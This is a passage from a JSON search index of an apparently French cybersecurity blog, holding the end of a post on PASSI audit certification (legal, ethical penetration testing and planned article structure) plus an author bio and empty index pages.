d\u0026rsquo;attaque courantes, telles que l\u0026rsquo;ingénierie sociale, le scan de ports, l\u0026rsquo;exploitation de vulnérabilités, etc. Vous devrez également apprendre à documenter rigoureusement chaque étape du test et à fournir des recommandations pour améliorer la sécurité des systèmes testés. Une bonne connaissance des lois et réglementations en matière de cybersécurité est essentielle, car les tests d\u0026rsquo;intrusion doivent être effectués de manière légale et éthique.\nConclusion # Je vais rédiger, 1 article par portée qui résume globalement mes découvertes sur les différentes portées. Chaque article qui suivera celui-ci sera principalement composé de : - Objectif de l\u0026rsquo;audit - Suite à quel type d\u0026rsquo;audit - Méthodologie d\u0026rsquo;audit - Déroulement de l\u0026rsquo;audit - Attendus clients - Quelques vulnérabilités types de l\u0026rsquo;audit - Documentation pratique ANSSI (ou autre)\n","date":"29 July 2023","permalink":"/cyber-posts-audits/passi/","section":"Cyber-posts-Audits","summary":"Cet article présente différents points sur le PASSI et les différentes portées de la certification PASSI, offrant un aperçu approfondi du monde mature de la cybersécurité.","title":"PASSI"},{"content":" 🎓 Graduaded of a Master of Engineering in Computer Science and CyberSecurity @CentraleSupélec 📚 I’m actively looking for interesting open source projects to contribute to. 👯 Co-founder and CTO of a promising Cybersecurity Startup, feel free to contact me. 📫 I am often available through my Twitter/LinkedIn for a tech chat around a virtual cup of coffee ☕. ","date":"1 January 0001","permalink":"/about/","section":"l1d1nsec","summary":"🎓 Graduaded of a Master of Engineering in Computer Science and CyberSecurity @CentraleSupélec 📚 I’m actively looking for interesting open source projects to contribute to. 👯 Co-founder and CTO of a promising Cybersecurity Startup, feel free to contact me.","title":""},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]